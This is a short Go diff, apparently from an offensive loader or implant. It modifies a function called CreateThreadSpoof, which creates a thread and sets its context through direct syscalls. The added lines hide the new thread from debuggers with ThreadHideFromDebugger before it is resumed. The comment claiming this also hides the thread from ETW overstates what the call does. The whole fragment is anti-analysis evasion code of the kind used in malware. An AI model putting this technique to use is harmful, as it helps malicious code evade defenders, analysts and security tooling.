@@ -207,6 +207,9 @@ func CreateThreadSpoof(startAddr uintptr) error {
 		return fmt.Errorf("create thread: %w", err)
 	}
 
+	// Hide the thread from debuggers and ETW before it is resumed.
+	_ = NtSetInformationThread(tHandle, ThreadHideFromDebugger, 0, 0)
+
 	r1, err := DirectSyscall("NtSetContextThread", tHandle, uintptr(unsafe.Pointer(ctx)))
 	if r1 != 0 || err != nil {
 		NtClose(tHandle)
